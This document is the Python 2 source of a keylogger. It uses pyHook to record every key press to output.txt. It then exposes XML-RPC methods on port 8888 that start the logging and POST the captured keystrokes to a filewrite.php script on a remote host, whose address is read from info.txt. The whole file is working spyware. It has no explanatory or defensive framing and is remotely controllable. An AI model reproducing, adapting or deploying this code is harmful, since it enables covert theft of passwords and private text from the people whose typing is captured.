from SimpleXMLRPCServer import SimpleXMLRPCServer, SimpleXMLRPCRequestHandler
from SocketServer import ThreadingMixIn
import pythoncom, pyHook
import httplib, urllib
import linecache
class theApp:
    def OnKeyBoardEvent(self, event):
        output1 = event.Key
        output = output1
        filename = "output.txt"
        fileit = open(filename, 'a')
        fileit.write(output)
        fileit.close()       
        return True
    def keyit(self):
        self.hm = pyHook.HookManager()
        self.hm.KeyDown = self.OnKeyBoardEvent
        self.hm.HookKeyboard()
        pythoncom.PumpMessages()

    def senddata(self):
        filename = "output.txt"
        fileit = open(filename, 'r')
        done = 0
        while not done:
            output = fileit.readline()
            if output != "":
                # 'text' is the value needed to be past to the php script to put in db
                # the form name is text which is a textarea
                params = urllib.urlencode({'text': output})
                headers = {"Content-type": "application/x-www-form-urlencoded",
                                "Accept": "text/plain"}
                conn = httplib.HTTPConnection(linecache.getline('info.txt', 1))
                conn.request("POST", "/filewrite.php", params, headers)
                response = conn.getresponse()
                print response.status, response.reason
                data = response.read()        
            else:
                done = 1
        fileit.close()
        return True
            
class ThreadingServer(ThreadingMixIn, SimpleXMLRPCServer):
    pass

serveraddr = ('', 8888)
srvr = ThreadingServer(serveraddr, SimpleXMLRPCRequestHandler)
srvr.register_instance(theApp())
srvr.register_introspection_functions()
srvr.register_multicall_functions()
srvr.serve_forever()
